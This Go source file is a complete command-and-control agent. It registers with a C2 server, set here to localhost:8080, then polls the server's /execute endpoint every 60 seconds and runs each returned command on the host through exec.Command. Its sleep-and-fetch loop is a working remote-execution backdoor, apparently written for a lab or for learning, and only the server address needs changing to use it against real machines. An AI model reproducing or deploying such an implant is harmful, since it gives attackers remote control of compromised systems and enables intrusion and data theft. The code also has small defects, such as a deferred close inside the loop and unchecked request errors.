package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"time"
)

var c2server = "localhost"
var c2serverport = "8080"

func main() {
	agentId := ""
	sleep := 60
	c2register := "http://" + c2server + ":" + c2serverport + "/register"
	register_resp, err := http.Get(c2register)

	if err != nil {
		log.Fatal(err)
	}

	defer register_resp.Body.Close()

	body, err := io.ReadAll(register_resp.Body)
	agentId = string(body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Agent ID:", agentId)
loop:
	for {
		fmt.Printf("[*] Sleeping for %v seconds", sleep)
		time.Sleep(time.Duration(sleep) * time.Second)
		data := url.Values{
			"agentId": {agentId},
		}
		c2execute := "http://" + c2server + ":" + c2serverport + "/execute"
		execute_response, err := http.PostForm(c2execute, data)

		if err != nil {
			log.SetFlags(0)
			log.Printf("[-] Error fetching command: %s", err)
		}

		defer execute_response.Body.Close()

		command, err := io.ReadAll(execute_response.Body)

		if string(command) == "no commands found" {
			log.SetFlags(0)
			log.Println("\n[-] No command to run")
			goto loop
		}

		fmt.Println("[+] Running command: " + string(command))
		command_clean := strings.Replace(string(command), "\n", "", -1)
		command_array := strings.Fields(command_clean)
		out, err := exec.Command(command_array[0], command_array[1:]...).Output()
		if err != nil {
			log.SetFlags(0)
			log.Printf("[-] Error running command: %s", err)
		}
		fmt.Println(string(out))
	}
}
